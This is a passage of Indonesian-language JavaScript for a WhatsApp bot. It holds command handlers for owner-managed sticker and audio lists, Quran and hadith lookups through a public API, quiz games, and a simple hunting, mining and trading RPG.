let oke = q.split('|')[0]
let oka = q.split('|')[1]
addError(oke, oka, listerror)
await setReply(`Sukses Menambahkan ${q} ke daftar error`)
}
break
case 'addstik':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!isQuotedSticker) return setReply('Reply stiker nya')
if (!q) return setReply('Nama sticker nya apa?')
if (setiker.includes(q)) return setReply("Nama tersebut sudah di gunakan")
let delb = await Araa.downloadAndSaveMediaMessage(quoted)
setiker.push(q)
await fse.copy(delb, `./media/sticker/stick/${q}.webp`)
global.setDatabase('stick.json', JSON.stringify(setiker))
fs.unlinkSync(delb)
setReply(`Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`)
}
break
case 'addvn':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!isQuotedAudio) return setReply('Reply vnnya')
if (!q) return setReply('Nama audionya apa')
if (audionye.includes(q)) return setReply("Nama tersebut sudah di gunakan")
let delb = await Araa.downloadAndSaveMediaMessage(quoted)
audionye.push(q)
await fse.copy(delb, `./media/audio/${q}.mp3`)
global.setDatabase('vn.json', JSON.stringify(audionye))
fs.unlinkSync(delb)
setReply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}
break                
case 'delerror':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
listerror.splice(q, 1)
global.setDatabase('listerror.json', JSON.stringify(listerror))
setReply(`Sukses menghapus ${q} di daftar error`)
}
break
case 'delstik':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!q) return setReply('Masukan query')
if (!setiker.includes(q)) return setReply("Nama tersebut tidak ada di dalam data base")
let wanu = setiker.indexOf(q)
setiker.splice(wanu, 1)
fs.unlinkSync(`./media/sticker/stick/${q}.webp`)
global.setDatabase('stick.json', JSON.stringify(setiker))
setReply(`Succes delete sticker ${q}!`)
}
break
case 'delvn':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!q) return setReply('Masukan query')
if (!audionye.includes(q)) return setReply("Nama tersebut tidak ada di dalam data base")
let wanu = audionye.indexOf(q)
audionye.splice(wanu, 1)
global.setDatabase('vn.json', JSON.stringify(audionye))
fs.unlinkSync(`./media/audio/${q}.mp3`)
setReply(`Sukses delete vn ${q}`)
}
break                
case 'listerror':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let teks = '「 *LIST ERROR* 」\n'
for (let x of listerror) {
teks += `_*Command*_ : ${x.cmd}\n_*System Error*_ : ${x.error}\n\n*]─────────────────[*\n\n`
}
teks += `\n*Total ada : ${listerror.length}*`
setReply(teks)
}
break
case 'liststik':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let teks = '┌──⭓「 *LIST STICKER* 」\n│\n'
for (let x of setiker) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${setiker.length}*`
setReply(teks)
}
break
case 'listvn':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let teks = '┌──⭓「 *LIST VN* 」\n│\n'
for (let x of audionye) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${audionye.length}*`
setReply(teks)
}
break                
case 'listban':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let banya = `*List Banned*\nJumlah : ${JSON.parse(fs.readFileSync('./database/banned.json')).length}\n\n`
JSON.parse(fs.readFileSync('./database/banned.json')).map(function (e, i) {
banya += i + 1 + `📲 Nomer : wa.me/${e.id}\n    📅 Tanggal : ${e.date}\n\n`
})
setReply(banya)
break
case 'listblockcmd':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let teks = '┌──⭓「 *LIST BLOCK CMD* 」\n│\n'
for (let i of listcmdblock) {
teks += `│⭔ ${i.cmd}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${listcmdblock.length}*`
setReply(teks)
}
break
case 'clearallerror':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
setReply('SukseS clear all error')
clearAllError(listerror)
break    
case 'clearallstik':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner() 
for (let x of setiker) {
let wanu = setiker.indexOf(x)
setiker.splice(wanu, 1)
fs.unlinkSync(`./media/sticker/stick/${x}.webp`)
global.setDatabase('stick.json', JSON.stringify(setiker)) 
}
setReply("Sukses")
}
break
case 'clearallvn':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner() 
for (let x of audionye) {
let wanu = audionye.indexOf(x)
audionye.splice(wanu, 1)
fs.unlinkSync(`./media/audio/${x}.mp3`)
global.setDatabase('vn.json', JSON.stringify(audionye)) 
}
setReply("Sukses")
}
break                                                                                                                   
case 'clearallban':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
setReply('Sukses clear all ban')
clearAllBan(ban)
break
case 'clearallUser':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
setReply('Suksek clear all User')
clearAllUser(user)
break    
//================================================================================\\
case 'hadis':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!args[0])
return setReply(`Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`)
if (!args[1]) return setReply(`Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`)
try {
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
let { number, arab, id } = res.find((v) => v.number == args[1])
setReply(`No. ${number}
${arab}
${id}`)
} catch (e) {
setReply(`Hadis tidak ditemukan !`)
}
}
break
case 'alquran':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!args[0]) return setReply(`Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`)
if (!args[1]) return setReply(`Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`)
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
setReply(txt)
Araa.sendMessage(from, { audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg' }, { quoted: m })
}
break
case 'tafsirsurah':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!args[0]) return setReply(`Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`)
if (!args[1]) return setReply(`Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`)
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
setReply(txt)
}
break
//================================================================================\\
case 'math':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let modes = {
noob: [-3, 3, -3, 3, '+-', 15000, 10],
easy: [-10, 10, -10, 10, '*/+-', 20000, 40],
medium: [-40, 40, -20, 20, '*/+-', 40000, 150],
hard: [-100, 100, -70, 70, '*/+-', 60000, 350],
extreme: [-999999, 999999, -999999, 999999, '*/', 99999, 9999],
impossible: [-99999999999, 99999999999, -99999999999, 999999999999, '*/', 30000, 35000],
impossible2: [-999999999999999, 999999999999999, -999, 999, '/', 30000, 50000],
}
let operators = {
'+': '+',
'-': '-',
'*': '×',
'/': '÷',
}
function genMath(mode) {
let [a1, a2, b1, b2, ops, time, bonus] = modes[mode]
let a = randomInt(a1, a2)
let b = randomInt(b1, b2)
let op = pickRandom([...ops])
let result = new Function(`return ${a} ${op.replace('/', '*')} ${b < 0 ? `(${b})` : b}`)()
if (op == '/') [a, result] = [result, a]
return {
str: `${a} ${operators[op]} ${b}`,
mode,
time,
bonus,
result,
}
}
function randomInt(from, to) {
if (from > to) [from, to] = [to, from]
from = Math.floor(from)
to = Math.floor(to)
return Math.floor((to - from) * Math.random() + from)
}
if (!q)
return setReply(`
┌─〔 Mode 〕
├ ${Object.keys(modes).join('\n├ ')}
└────    
contoh:
${prefix}math hard
`)
let mode = args[0].toLowerCase()
if (!(mode in modes))
return setReply(`
┌─〔 Mode 〕
├ ${Object.keys(modes).join('\n├ ')}
└────    
contoh:
${prefix}math hard
`)
let id = from
if (id in Araa.math) return setReply('Masih ada soal belum terjawab di chat ini')
let math2 = genMath(mode)
Araa.math[id] = [
await setReply(`Berapa hasil dari *${math2.str}*?\n\nTimeout: ${(math2.time / 1000).toFixed(2)} detik\nBonus Jawaban Benar: Rp${math2.bonus} `),
math2,
4,
setTimeout(async () => {
if (Araa.math[id]) await setReply(`Waktu habis!\nJawabannya adalah ${math2.result}\n\n${math2.mode.toUpperCase()}\n\nmath ${math2.mode}`)
delete Araa.math[id]
}, math2.time),
]
}
break
case 'tebakgambar':
case 'caklontong':
case 'tebakkata':
case 'tebakkalimat':
case 'siapaaku':
case 'tebaklirik':
case 'tebaktebakan':
case 'susunkata':{
let anu = await fetchJson(`https://raw.githubusercontent.com/BochilTeam/database/master/games/${command}.json`)
let result = anu[Math.floor(Math.random() * anu.length)]
if (command == 'tebakgambar') {
if (cekTebakgambar(senderNumber)) return setReply("Masih ada soal yang belum selesai")
addTebakgambar(senderNumber, result.deskripsi, result.jawaban, result.img) 
await Araa.sendMessage(from, { image: { url: getImageTebakgambar(senderNumber) }, caption: getSoalTebakgambar(senderNumber) }, { quoted: m })
} else if (command == 'caklontong') {
if (cekCaklontong(senderNumber)) return setReply("Masih ada soal yang belum selesai")
addCaklontong(senderNumber, result.soal, result.jawaban, result.deskripsi) 
await setReply(`Soal: ${getSoalCaklontong(senderNumber)}\nDeskripsi: ${getDeskripsiCaklontong(senderNumber)}`) 
} else if (command == 'tebakkata') {
if (cekTebakkata(senderNumber)) return setReply("Masih ada soal yang belum selesai")
addTebakkata(senderNumber, result.soal, result.jawaban) 
await setReply(`Soal: ${getSoalTebakkata(senderNumber)}`) 
} else if (command == 'tebakkalimat') {
if (cekTebakkalimat(senderNumber)) return setReply("Masih ada soal yang belum selesai")
addTebakkalimat(senderNumber, result.soal, result.jawaban) 
await setReply(`Soal: ${getSoalTebakkalimat(senderNumber)}`) 
} else if (command == 'siapaaku') {
if (cekSiapaaku(senderNumber)) return setReply("Masih ada soal yang belum selesai")
addSiapaaku(senderNumber, result.soal, result.jawaban) 
await setReply(`Soal: ${getSoalSiapaaku(senderNumber)}`) 
} else if (command == 'tebaklirik') {
if (cekTebaklirik(senderNumber)) return setReply("Masih ada soal yang belum selesai")
addTebaklirik(senderNumber, result.soal, result.jawaban) 
await setReply(`Soal: ${getSoalTebaklirik(senderNumber)}`) 
} else if (command == 'tebaktebakan') {
if (cekTebaktebakan(senderNumber)) return setReply("Masih ada soal yang belum selesai")
addTebaktebakan(senderNumber, result.soal, result.jawaban) 
await setReply(`Soal: ${getSoalTebaktebakan(senderNumber)}`) 
} else if (command == 'susunkata') {
if (cekSusunkata(senderNumber)) return setReply("Masih ada soal yang belum selesai")
addSusunkata(senderNumber, result.soal, result.tipe, result.jawaban) 
await setReply(`Soal: ${getSoalTebaktebakan(senderNumber)}\nType: ${getTypeTebaktebakan(senderNumber)}`) 
}
}
break
case 'tebakbendera':{
let anu = await fetchJson(`https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json`)
let result = anu[Math.floor(Math.random() * anu.length)]
if (cekTebakbendera(senderNumber)) return setReply("Masih ada soal yang belum selesai")
addTebakbendera(senderNumber, result.img, result.name) 
await Araa.sendMessage(from, { image: { url: getSoalTebakbendera(senderNumber) }, caption: "Duration : 60s" }, { quoted: m })
}
break
//================================================================================\\
case 'leaderboard':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let txt = `「 *LEADERBOARD* 」\n\n`
for (let i of user) {
txt += `➸ *ID :* ${i.id}\n`
txt += `*🐟Ikan* : ${i.ikan}\n`
txt += `*🐔Ayam* : ${i.ayam}\n`
txt += `*🐇Kelinci* : ${i.kelinci}\n`
txt += `*🐑Domba* : ${i.domba}\n`
txt += `*🐄Sapi* : ${i.sapi}\n`
txt += `*🐘Gajah* : ${i.gajah}\n\n`
}
setReply(txt)
}
break
case 'mining':
case 'menambang':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isCekDarah < 1) return setReply('Kamu kelelahan!, cobalah heal menggunakan potion')
let besi = [1, 2, 5, 0, 3, 0, 1, 1, 4, 1, 5, 0, 0]
let emas = [0, 1, 2, 3, 0, 0, 0, 1, 1, 0, 0, 2]
let emerald = [0, 0, 1, 0, 0, 1, 0, 2, 1, 0, 0, 1]
var besinya = besi[Math.floor(Math.random() * besi.length)]
var emasnya = emas[Math.floor(Math.random() * emas.length)]
var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]
setTimeout(() => {
let caption = `[ HASIL MENAMBANG ]\n*Besi* : ${besinya}\n*Emas* : ${emasnya}\n*Emerald* : ${emeraldnya}`
let buttons = [
{ buttonId: `${prefix + command}`, buttonText: { displayText: 'Menambang lagi⛏️' }, type: 1 },
{ buttonId: `${prefix}inventori`, buttonText: { displayText: 'inventori📦' }, type: 1 },
]
let buttonMessage = {
image: { url: './media/image/rpg/tambang.jpg' },
caption: caption,
footer: fake,
buttons: buttons,
headerType: 4,
}
Araa.sendMessage(from, buttonMessage, { quoted: setQuoted })
}, 7000)
setTimeout(() => {
setReply(`${senderNumber} Mulai menambang🎣`)
}, 1500)
kurangDarah(senderNumber, 10)
addBesi(senderNumber, besinya)
addEmas(senderNumber, emasnya)
addEmerald(senderNumber, emeraldnya)
}
break
case 'beli':
case 'buy':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('Mau beli apa?\n*Berikut listnya*\n> potion\n> umpan\n> limit')
var anu = args[1]
if (args[0] === 'potion') {
let noh = 100000 * anu
if (!args[1]) return setReply(`Example : ${prefix + command} potion 2\n 1 potion = 100000 monay`)
if (isMonay < noh) return setReply('Sisa monay kamu tidak mencukupi untuk pembelian ini')
kurangMonay(senderNumber, noh)
var apalu = anu * 1
addPotion(senderNumber, apalu)
setTimeout(() => {
setReply(`Transaksi berhasil ✔️\n*Sisa monay kamu* : ${getMonay(senderNumber)}\n*Potion kamu* : ${getPotion(senderNumber)}`)
}, 2000)
} else if (args[0] === 'umpan') {
let noh = 5000 * anu
if (!args[1]) return setReply(`Example : ${prefix + command} umpan 2\n 1 umpan = 2500 monay`)
if (isMonay < noh) return setReply('Sisa monay kamu tidak mencukupi untuk pembelian ini')
kurangMonay(senderNumber, noh)
var apalu = anu * 1
addUmpan(senderNumber, apalu)
setTimeout(() => {
setReply(`Transaksi berhasil ✔️\n*Sisa monay kamu* : ${getMonay(senderNumber)}\n*Umpan kamu* : ${getUmpan(senderNumber)}`)
}, 2000)
} else if (args[0] === 'limit') {
let noh = 35000 * anu
if (!args[1]) return setReply(`Example : ${prefix + command} limit 2\n 1 limit = 35000 monay`)
if (isMonay < noh) return setReply('Sisa monay kamu tidak mencukupi untuk pembelian ini')
kurangMonay(senderNumber, noh)
var apalu = anu * 1
tambahLimit(senderNumber, apalu)
setTimeout(() => {
setReply(`Transaksi berhasil ✔️\n*Sisa monay kamu* : ${getMonay(senderNumber)}\n*Limit kamu* : ${getLimit(senderNumber)}`)
}, 2000)
} else {
setReply('Format salah!')
}
}
break
case 'sel':
case 'jual':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Mau jual apa?\n*Kamu bisa yang ada di list berikut*\n> ikan\n> ayam\n> kelinci\n> domba\n> sapi\n> gajah\n> besi\n> emas\n> emerald`)
var anu = args[1]
if (args[0] === 'ikan') {
if (isIkan < anu) return setReply('Ikan kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} ikan 2\n 1 ikan = 1500 monay`)
kurangIkan(senderNumber, anu)
let monaynya = 1500 * anu
addMonay(senderNumber, monaynya)
setTimeout(() => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa Ikan kamu* : ${getIkan(senderNumber)}`)
}, 2000)
} else if (args[0] === 'ayam') {
if (isAyam < anu) return setReply('Ayam kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} ayam 2\n 1 ayam = 2500 monay`)
kurangAyam(senderNumber, anu)
let monaynya = 2500 * anu
addMonay(senderNumber, monaynya)
setTimeout(() => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa Ayam kamu* : ${getAyam(senderNumber)}`)
}, 2000)
} else if (args[0] === 'kelinci') {
if (isKelinci < anu) return setReply('Kelinci kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} kelinci 2\n 1 kelinci = 3000 monay`)
kurangKelinci(senderNumber, anu)
let monaynya = 3000 * anu
addMonay(senderNumber, monaynya)
setTimeout(() => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa Kelinci kamu* : ${getKelinci(senderNumber)}`)
}, 2000)
} else if (args[0] === 'domba') {
if (isDomba < anu) return setReply('Domba kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} domba 2\n 1 domba = 5000 monay`)
kurangDomba(senderNumber, anu)
let monaynya = 5000 * anu
addMonay(senderNumber, monaynya)
setTimeout(() => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa Domba kamu* : ${getDomba(senderNumber)}`)
}, 2000)
} else if (args[0] === 'sapi') {
if (isSapi < anu) return setReply('Sapi kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} sapi 2\n 1 sapi = 10000 monay`)
kurangSapi(senderNumber, anu)
let monaynya = 10000 * anu
addMonay(senderNumber, monaynya)
setTimeout(() => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa Sapi kamu* : ${getSapi(senderNumber)}`)
}, 2000)
} else if (args[0] === 'gajah') {
if (isGajah < anu) return setReply('Gajah kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} gajah 2\n 1 gajah = 15000 monay`)
kurangGajah(senderNumber, anu)
let monaynya = 15000 * anu
addMonay(senderNumber, monaynya)
setTimeout(() => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa Gajah kamu* : ${getGajah(senderNumber)}`)
}, 2000)
} else if (args[0] === 'besi') {
if (isBesi < anu) return setReply('Besi kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} besi 2\n 1 besi = 15000 monay`)
kurangBesi(senderNumber, anu)
let monaynya = 16000 * anu
addMonay(senderNumber, monaynya)
setTimeout(() => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa Besi kamu* : ${getBesi(senderNumber)}`)
}, 2000)
} else if (args[0] === 'emas') {
if (isEmas < anu) return setReply('Emas kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} emas 2\n 1 emas = 50000 monay`)
kurangEmas(senderNumber, anu)
let monaynya = 50000 * anu
addMonay(senderNumber, monaynya)
setTimeout(() => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa emas kamu* : ${getEmas(senderNumber)}`)
}, 2000)
} else if (args[0] === 'emerald') {
if (isEmerald < anu) return setReply('Emerald kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} emerald 2\n 1 emerald = 100000 monay`)
kurangEmerald(senderNumber, anu)
let monaynya = 100000 * anu
addMonay(senderNumber, monaynya)
setTimeout(() => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa emerald kamu* : ${getEmerald(senderNumber)}`)
}, 2000)
} else {
setReply('Format salah!')
}
}
break
case 'heal':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isCekDarah < 1) return setReply('Kamu hanya bisa heal ketika darah kamu 0')
if (isCekDarah > 100) return setReply('Darah kamu sudah penuh')
if (isPotion < 1) return setReply('Kamu tidak punya potion, cobalah beli dengan cara #buypotion _jumlah_')
addDarah(senderNumber, 100)
kurangPotion(senderNumber, 1)
setReply('Berhasil, darah kamu sudah full')
}
break
case 'berburu':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isCekDarah < 1) return setReply('Darah kamu habis, cobalah heal menggunakan potion')
let luka = ['Tertusuk duri saat berburu', 'Terpeleset ke jurang saat berburu', 'Tercakar hewan buas', 'Tidak berhati-hati', 'Terjerat akar', 'Terjatuh saat berburu']
let location = ['Hutan rimba', 'Hutan Amazon', 'Hutan tropis', 'Padang rumput', 'Hutan afrika', 'Pegunungan']
var ikanmu = Math.ceil(Math.random() * 10)
var ayam = Math.ceil(Math.random() * 8)
var kelinci = Math.ceil(Math.random() * 7)
var dombanya = [3, 0, 4, 0, 5, 4, 6, 0, 1, 0, 2, 3, 0, 3, 0, 1]
var sapinya = [2, 0, 3, 0, 4, 0, 5, 0, 1, 0, 2, 0, 3, 0, 1]
var gajahnya = [1, 0, 4, 0, 2, 0, 1, 0, 2, 1, 3, 0, 1]
var domba = dombanya[Math.floor(Math.random() * dombanya.length)]
var sapi = sapinya[Math.floor(Math.random() * sapinya.length)]
var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)]
var lukanya = luka[Math.floor(Math.random() * luka.length)]
var lokasinya = location[Math.floor(Math.random() * location.length)]
if (lokasinya === 'Hutan rimba') {
var image = './media/image/rpg/rimba.jpg'
} else if (lokasinya === 'Hutan Amazon') {
var image =  './media/image/rpg/amazon.jpg'
} else if (lokasinya === 'Hutan tropis') {
var image = './media/image/rpg/tropis.jpg'
} else if (lokasinya === 'Padang rumput') {
var image = './media/image/rpg/padang_rumput.jpg'
} else if (lokasinya === 'Hutan afrika') {
var image = './media/image/rpg/afrika.jpg'
} else if (lokasinya === 'Pegunungan') {
var image = './media/image/rpg/pegunungan.jpg'
}
setTimeout(() => {
let teksehmazeh = `_[ HASIL BURUAN ]_\n`
teksehmazeh += `*🐟Ikan* : ${ikanmu}\n`
teksehmazeh += `*🐔Ayam* : ${ayam}\n`
teksehmazeh += `*🐇Kelinci* : ${kelinci}\n`
teksehmazeh += `*🐑Domba* : ${domba}\n`
teksehmazeh += `*🐄Sapi* : ${sapi}\n`
teksehmazeh += `*🐘Gajah* : ${gajah}\n\n`
teksehmazeh += `_[ INFO ]_\n`
teksehmazeh += `*Lokasi* : ${lokasinya}\n`
teksehmazeh += `*Terluka* : ${lukanya}, darah - 10\n`
teksehmazeh += `*Sisa darah* : ${getDarah(senderNumber)}\n`
let buttons = [
{ buttonId: `${prefix + command}`,buttonText: {displayText: 'Berburu lagi️🏹'}, type: 1},
{ buttonId: `${prefix}inventori`,buttonText: {displayText: 'inventori📦'}, type: 1}]
let buttonMessage = {
image: { url: image },
caption: teksehmazeh,
footer: fake,
buttons: buttons,
headerType: 4
}
Araa.sendMessage(from, buttonMessage, { quoted: setQuoted })      
}, 5000)
setTimeout(() => {
setReply(`${senderNumber} Mulai berburu di ${lokasinya}`)
}, 1000)
addIkan(senderNumber, ikanmu)
addAyam(senderNumber, ayam)
addKelinci(senderNumber, kelinci)
addDomba(senderNumber, domba)
addSapi(senderNumber, sapi)
addGajah(senderNumber, gajah)
kurangDarah(senderNumber, 10)
}
break
case 'inventori':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let teksehmazeh = `_[ 👩🏻‍💼INFO USER👨🏻‍💼 ]_\n\n`
teksehmazeh += `*❤️Darah kamu* : ${getDarah(senderNumber)}\n`
teksehmazeh += `*◻️️Besi kamu* : ${getBesi(senderNumber)}\n`
teksehmazeh += `*🌟Emas Kamu* : ${getEmas(senderNumber)}\n`
teksehmazeh += `*💎Emerald Kamu* : ${getEmerald(senderNumber)}\n`
teksehmazeh += `*⏺️Limit kamu* : ${getLimit(senderNumber)}\n`
teksehmazeh += `*🧪Potion Kamu* : ${getPotion(senderNumber)}\n\n`
teksehmazeh += `_[ 🐺HASIL BURUAN🐺 ]_\n`
teksehmazeh += `*🐟Ikan* : ${getIkan(senderNumber)}\n`
teksehmazeh += `*🐔Ayam* : ${getAyam(senderNumber)}\n`
teksehmazeh += `*🐇Kelinci* : ${getKelinci(senderNumber)}\n`
teksehmazeh += `*🐑Domba* : ${getDomba(senderNumber)}\n`
teksehmazeh += `*🐄Sapi* : ${getSapi(senderNumber)}\n`
teksehmazeh += `*🐘Gajah* : ${getGajah(senderNumber)}\n\n`
teksehmazeh += `_*${botName}*_`
setReply(teksehmazeh)
}
break
case 'mancing':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isUmpan < 1) return setReply('Umpan kamu habis!, cobalah berburu dan ubah dagingnya menjadi umpan')
setReply('1 umpan terpakai')
var ikannya = ikan[Math.floor(Math.random() * ikan.length)]
var ditangkap = Math.ceil(Math.random() * 20)
setTimeout(() => {
let caption = `Hasil tangkapan : ${ikannya}\n> Jumlah tangkapan : ${ditangkap}`
let buttons = [
{ buttonId: `${prefix + command}`, buttonText: { displayText: 'Mancing lagi🎣' }, type: 1 },
{ buttonId: `${prefix}inventori`, buttonText: { displayText: 'inventori📦' }, type: 1 },
]
let buttonMessage = {
image: { url: './media/image/rpg/mancing.jpg' },
caption: caption,
footer: fake,
buttons: buttons,
headerType: 4,
}
Araa.sendMessage(from, buttonMessage, { quoted: setQuoted })
}, 7000)
setTimeout(() => {
setReply(`${senderNumber} Mulai memancing🎣`)
}, 1500)
kurangUmpan(senderNumber, 1)
addIkan(senderNumber, ditangkap)
}
break
case 'darah':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let dapat = getDarah(senderNumber)
setReply(`${dapat}`)
}
break
case 'goreng':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!args[0]) return setReply('goreng apa kak\n 1.ikan\n 2.ayam\n 3.kelinci\n 4.domba\n 5.sapi\n 6.gajah')
if (!args[1]) return setReply('jumlahnya?')
if (args[1] === '1' || args[1] === '2' || args[1] === '3' || args[1] === '4' || args[1] === '5' || args[1] === '6' || args[1] === '7' || args[1] === '8' || args[1] === '9') return setReply('minimal 10 kak')
if (args[0] === 'ikan' && args[1]) {
if (getIkan(senderNumber) < 10) return setReply('Anda tidak memeliki cukup ikan')
let kontolGoreng = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
let memekGoreng = pickRandom(kontolGoreng)
let anu = args[1]
let ana = (anu -= memekGoreng)
kurangIkan(senderNumber, anu)
addIkanGoreng(senderNumber, memekGoreng)
for (let i = 0; i < memekGoreng; i++) {
setReply(`berhasil menggoreng ikan ${i + 1}`)
}
setReply(`ikan goreng anda saat ini ${getIkanGoreng(senderNumber)}\n[ HASIL GORRNG ] \n matang : ${memekGoreng} \n gosong : ${ana}`)
} else if (args[0] === 'ayam' && args[1]) {
if (getAyam(senderNumber) < 10) return setReply('Anda tidak memeliki cukup ayam')
let kontolGoreng = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
let memekGoreng = pickRandom(kontolGoreng)
let anu = args[1]
let ana = (anu -= memekGoreng)
kurangAyam(senderNumber, anu)
addAyamGoreng(senderNumber, memekGoreng)
for (let i = 0; i < memekGoreng; i++) {
setReply(`berhasil menggoreng ayam ${i + 1}`)
}
setReply(`ayam goreng anda saat ini ${getAyamGoreng(senderNumber)}\n[ HASIL GORRNG ] \n matang : ${memekGoreng} \n gosong : ${ana}`)
} else if (args[0] === 'kelinci' && args[1]) {
if (getKelinci(senderNumber) < 10) return setReply('Anda tidak memeliki cukup kelinci')
let kontolGoreng = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
let memekGoreng = pickRandom(kontolGoreng)
let anu = args[1]
let ana = (anu -= memekGoreng)
kurangKelinci(senderNumber, anu)
addKelinciGoreng(senderNumber, memekGoreng)
for (let i = 0; i < memekGoreng; i++) {
setReply(`berhasil menggoreng kelinci ${i + 1}`)
}
setReply(`kelinci goreng anda saat ini ${getKelinciGoreng(senderNumber)}\n[ HASIL GORRNG ] \n matang : ${memekGoreng} \n gosong : ${ana}`)
} else if (args[0] === 'domba' && args[1]) {
if (getDomba(senderNumber) < 10) return setReply('Anda tidak memeliki cukup domba')
